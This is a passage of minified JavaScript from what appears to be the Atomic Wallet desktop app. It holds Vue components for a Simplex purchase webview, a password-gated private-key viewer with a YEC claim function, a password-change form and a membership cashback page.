            name: "SimplexWebview",
            data: () => ({
              simplexWebView: null,
              showReady: !1,
              preload: "file:" + i(222).resolve(e, "./simplexInject.js"),
            }),
            computed: {
              ...(0, a.mapGetters)(["simplexSession", "simplexNewTransaction"]),
              sessionUrl() {
                let e = "";
                try {
                  e = this.simplexSession.headers.location.replace(
                    "/payments/new?",
                    ""
                  );
                } catch (t) {
                  console.warn("Simplex request failed: ", t);
                }
                return "https://checkout.simplexcc.com/payments/new?" + e;
              },
            },
            mounted() {
              (this.simplexWebView = this.$refs.simplex_webview),
                this.simplexWebView.addEventListener("new-window", (e) => {
                  ipcRenderer.send("openExternal", e.url);
                }),
                this.startSimplexSession(this.simplexSession);
            },
            methods: {
              ...(0, a.mapActions)([
                "changeTab",
                "updateSimplexTransactionsFromDB",
              ]),
              async saveTxToLocalDb(e) {
                let { buyParams: t, cashbackParams: i } = e;
                const a = {
                  id: t.paymentId,
                  userId: t.atomicId,
                  status: t.status,
                  txHash: null,
                  payoutHash: null,
                  payoutAddress: t.payoutAddress,
                  fromCurrency: t.fromCurrency,
                  toCurrency: t.toCurrency,
                  amountToSend: t.amountSend,
                  amountToReceive: t.amountReceive,
                  expectedCashbackAmount: i.estimatedAwcCashback,
                  timestamp: new Date().toISOString(),
                };
                this.$simplexDb.addSimplexTransactionToDb(a),
                  await this.updateSimplexTransactionsFromDB();
              },
              goToFirstTab() {
                this.$router.push("/simplex"), this.changeTab(0);
              },
              async startSimplexSession() {
                this.$simplexDb.postCashbackBuyTx(this.simplexNewTransaction),
                  this.saveTxToLocalDb(this.simplexNewTransaction),
                  this.simplexWebView.addEventListener("dom-ready", () => {
                    const e = 100;
                    setTimeout(() => {
                      this.showReady = !0;
                    }, e),
                      this.simplexWebView.send("check-success");
                  }),
                  this.simplexWebView.addEventListener(
                    "ipc-message",
                    (e) => {
                      "success" === e.channel && this.goToFirstTab();
                    },
                    { once: !0 }
                  ),
                  this.simplexWebView.addEventListener("will-navigate", (e) => {
                    "https://atomicwallet.io/" === e.url && this.goToFirstTab();
                  }),
                  this.simplexWebView.addEventListener("close", (e) =>
                    this.goToFirstTab()
                  );
              },
            },
          };
        t.default = s;
      }).call(this, "/");
    },
    842: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(53)),
        n = a(i(5547)),
        o = a(i(2282));
      const r = "Invalid password";
      var c = {
        name: "PrivateKeysTab",
        components: { Edit: s.default, CustomKey: n.default, Alert: o.default },
        data() {
          return {
            keys: [],
            claiming: !1,
            claimOk: !1,
            claimFail: !1,
            passwordForKey: "",
            privateKeyError: "",
            innerKeyState: "",
            btnDisabled: !1,
            filter: "",
            mnemonic: "",
          };
        },
        computed: {
          keysData() {
            const e = this.filter.toLowerCase();
            return this.keys.filter(
              (t) =>
                0 === e.length ||
                t.ticker.toLowerCase().indexOf(e) >= 0 ||
                t.name.toLowerCase().indexOf(e) >= 0
            );
          },
        },
        beforeDestroy() {
          (this.mnemonic = ""), (this.keys = []);
        },
        methods: {
          async claimFunds(e) {
            let t, i;
            (this.claiming = !0),
              "YEC" === e &&
                ((i = this.$wallets.getWallet("YEC")),
                (t = this.$wallets.getWallet("ZEC"))),
              t || i || (this.claiming = !1);
            const a = await i
              .createClaimTransaction(t.privateKey)
              .catch((e) => {
                console.log(e);
              });
            if (!a) return void this.successClaim();
            const s = await i.sendTransaction(a).catch((e) => console.log(e));
            s ? this.successClaim(s) : this.successClaim();
          },
          eosTextClipboard(e, t) {
            return `${this.$options.filters.$formatTextTrim(
              e,
              16
            )}\n          ${this.$options.filters.$formatTextTrim(t, 16)}`;
          },
          successClaim(e) {
            e ? (this.claimOk = !0) : (this.claimFail = !0);
          },
          open() {
            this.$electron.openExternal(
              "https://support.atomicwallet.io/article/94-how-to-keep-your-money-safe"
            );
          },
          clearClaimStatus(e) {
            e ? (this.claimOk = !1) : (this.claimFail = !1),
              (this.claiming = !1);
          },
          async loadKeysData() {
            this.privateKeyError = "";
            const e = await this.$wallets
              .checkPassword(this.passwordForKey)
              .catch((e) => {
                console.error(e), (this.privateKeyError = r);
              });
            if (e) {
              this.filter = "";
              try {
                (this.keys = (
                  await this.$wallets.loadKeysData(this.passwordForKey)
                ).map((e) => ({ ...e, icon: this.$iconClass(e) }))),
                  (this.mnemonic = e),
                  (this.innerKeyState = !0),
                  (this.privateKeyError = "");
              } catch (t) {
                (this.privateKeyError = t.message), (this.keys = []);
              }
              this.passwordForKey = "";
            }
          },
        },
      };
      t.default = c;
    },
    845: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(53)),
        n = a(i(2296));
      const o = 5e3;
      var r = {
        name: "SecurityTab",
        components: { Edit: s.default, PasswordStrength: n.default },
        data: () => ({
          oldPassword: "",
          newPassword: "",
          repeatNewPassword: "",
          newPasswordError: "",
          repeatNewPasswordError: "",
          oldPasswordError: "",
          passwordWasSuccessfullyChanged: !1,
          btnDisabled: !1,
          repeatPasswordType: "password",
        }),
        watch: {
          oldPassword() {
            this.btnDisabled = !1;
          },
          newPassword() {
            this.btnDisabled = !1;
          },
          repeatNewPassword() {
            this.btnDisabled = !1;
          },
        },
        methods: {
          changeTypeRepeatPassword(e) {
            this.repeatPasswordType = e;
          },
          changeOldPassword() {
            return (
              (this.oldPasswordError = ""),
              (this.newPasswordError = ""),
              (this.repeatNewPasswordError = ""),
              "" === this.oldPassword
                ? ((this.oldPasswordError = "Enter your password"),
                  this.$refs.oldPasswordRef.setFocus(),
                  !1)
                : "" === this.newPassword
                ? ((this.newPasswordError = "Enter your new password"),
                  this.$refs.newPasswordRef.setFocus(),
                  !1)
                : this.newPassword !== this.repeatNewPassword
                ? ((this.repeatNewPasswordError = "Passwords don't match"),
                  this.$refs.repeatNewPasswordRef.setFocus(),
                  !1)
                : void (
                    this.btnDisabled ||
                    ((this.btnDisabled = !0),
                    this.$wallets
                      .changePassword(this.oldPassword, this.newPassword)
                      .then(() => {
                        (this.btnDisabled = !1),
                          (this.oldPassword = ""),
                          (this.newPassword = ""),
                          (this.repeatNewPassword = ""),
                          (this.oldPasswordError = ""),
                          (this.newPasswordError = ""),
                          (this.repeatNewPasswordError = ""),
                          (this.passwordWasSuccessfullyChanged = !0),
                          setTimeout(() => {
                            this.passwordWasSuccessfullyChanged = !1;
                          }, o);
                      })
                      .catch((e) => {
                        (this.oldPasswordError = e), (this.btnDisabled = !1);
                      }))
                  )
            );
          },
        },
      };
      t.default = r;
    },
    846: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(17),
        s = {
          name: "Membership",
          data() {
            return { amount: 0 };
          },
          computed: {
            ...(0, a.mapGetters)(["hasTransaction"]),
            settings() {
              return this.$cashback.currentLevel(this.amount);
            },
          },
          async mounted() {
            this.$ga.event("User Movement", "membership-page", {
              clientID: this.$ga.customParams.uid,
            }),
              (this.amount = await this.$membership.getBalance());
          },
          methods: {
            neededAmount(e) {
              const t = e - this.amount;
              return t < 0 ? "0" : String(Math.ceil(t));
            },
            isNeededAmount(e) {
              return 0 !== e && 0 !== Number(this.neededAmount(e));
            },
            openCashbackExchange() {
              const e = Object.values(
                  this.$wallets.getWallet("BSC").tokens
                ).find((e) => {
                  let { ticker: t } = e;
                  return "AWC" === t;
                }),
                t = this.$wallets.getWallet("ETH");
              this.$ga.event("User Actions", "Buy AWC Popup", {
                clientID: this.$ga.customParams.uid,
              }),
                this.$router.push({
                  path: "/exchange",
                  query: { coinToReceive: e.id, coinToSend: t.id },
                });
            },
          },
        };
      t.default = s;
    },
  },
]);
